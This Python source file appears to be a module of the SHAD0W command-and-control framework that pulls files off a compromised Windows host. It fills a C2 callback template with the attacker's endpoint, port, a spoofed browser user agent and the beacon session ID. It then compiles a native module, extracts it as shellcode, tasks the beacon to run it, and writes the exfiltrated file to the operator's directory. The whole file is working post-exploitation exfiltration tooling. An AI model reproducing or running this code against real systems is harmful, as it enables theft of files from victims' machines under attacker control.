#
# Upload a file
#

import os
import base64
import argparse
import traceback

from lib import buildtools

__description__ = "Download a file from a target"
__author__ = "@_batsec_"
__type__ = "file system"

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# name of the file to download
FILE_TO_DOWNLOAD = ""


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None):
    if message is not None:
        print(message)


def download_callback(shad0w, data):
    global FILE_TO_DOWNLOAD

    shad0w.beacons[shad0w.current_beacon]["callback"] = None

    FILE_TO_DOWNLOAD = ''.join(FILE_TO_DOWNLOAD)

    shad0w.debug.good(f"Downloading '{FILE_TO_DOWNLOAD}' ({len(data)} bytes)")

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # os.unlink(FILE_TO_DOWNLOAD)

    with open(FILE_TO_DOWNLOAD, 'wb') as file:
        file.write(base64.b64decode(data))

    # change the dir to our root
    os.chdir("/root/shad0w/")

    shad0w.debug.good(f"Downloaded")

    return ""


def main(shad0w, args):
    global FILE_TO_DOWNLOAD

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon.")
        return

    # usage examples
    usage_examples = """

Examples:

download C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='download',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("file", nargs='*', help="File you want to download")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # we need a file to read so if we don't then fail
    if len(args.file) == 0:
        print(error_list)
        parse.print_help()
        return

    # save the current dir
    shad0w_cwd = os.getcwd()

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # make this variable global so the call back can access it 
    FILE_TO_DOWNLOAD = args.file

    # change back to our dir
    os.chdir(shad0w_cwd)

    # clean up the file name
    read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/download/",
                                  builddir="/root/shad0w/modules/windows/download/build")

    # set the correct settings
    template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _C2CALLBACK_URI L"/tasks"
#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\\r\\n"
#define _HEADER_LEN -1
#define SESSION_ID "%s"
#define DO_CALLBACK 0x4000
#define FILENAME "%s" """ % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, read_file)

    buildtools.update_settings_file(None, custom_template=template,
                                    custom_path="/root/shad0w/modules/windows/download/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/download/build",
                             modlocation="/root/shad0w/modules/windows/download/module.exe", arch="x64")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/download/module.exe",
                                         want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = download_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
